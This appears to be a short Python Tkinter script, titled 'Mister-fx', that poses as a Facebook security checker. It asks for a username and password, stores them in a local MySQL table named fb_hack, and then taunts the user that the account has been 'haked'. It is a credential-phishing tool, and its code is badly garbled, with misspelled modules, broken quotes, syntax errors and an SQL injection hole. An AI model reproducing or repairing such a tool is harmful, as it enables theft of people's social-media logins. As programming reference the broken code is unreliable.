# Mister-fx
Dont use to harm any one
mport pymysl
import random
from tkinter import * 
from tkinter import messangerbox
import tkinter.messagebox

root=Tk()
root.title("Facebook hake misterfx")
root.geometry("700×400")

def login():
       u=usn.get()
       p=psw.get()
       usn.set("")
       psw.set("")
       db=pymsql.connect("localhost","root","","fb_hack")
        cr=db.cursor()
        cr.execute("INSERT INTO 'fb_hack' ('username'.'password') VALUES ('%s','%s')"%(u,p))
        db.commit()
        data=cr.fetchall()
   
   if data !=():
                    messangerbox.showerro("!","INVALID")
   els :
          r = random.randint(1,101)
          messangerbox.showinfo("WARNING"YOUR ACCOUNT HAS BEEN HAKED BY MISTER FX "%s TIMES"%(r))
usn=StringVar()
psw+StringVar()

title = label(root,text="How Secure is faceBook ?? ',bg="blue",fg="white",font=("arial",15),bd=20).grad(row=0,column=0
lb1 = Label(root,text="username : ",font=(",15),grid(row=1,column=0)
lb2 = Label(root.text="username : ",font=(arial",15),bd=10).grid(row=2,column=0)

us=Entry(root,font=("arial",15),bd=5,textvariable=usn) .grid(row=1,column=1)
pas=enter(root,font=("arial",15),bd=5,show="*",textvariable=psw) .grid(row=2,column=2)

lb13 =Label(root).grid(row=2)

btn=Button(root,text="Check Now",font=("arial",15),bd=3,command=login).graid(row=3,column=1)
root.mainloop()
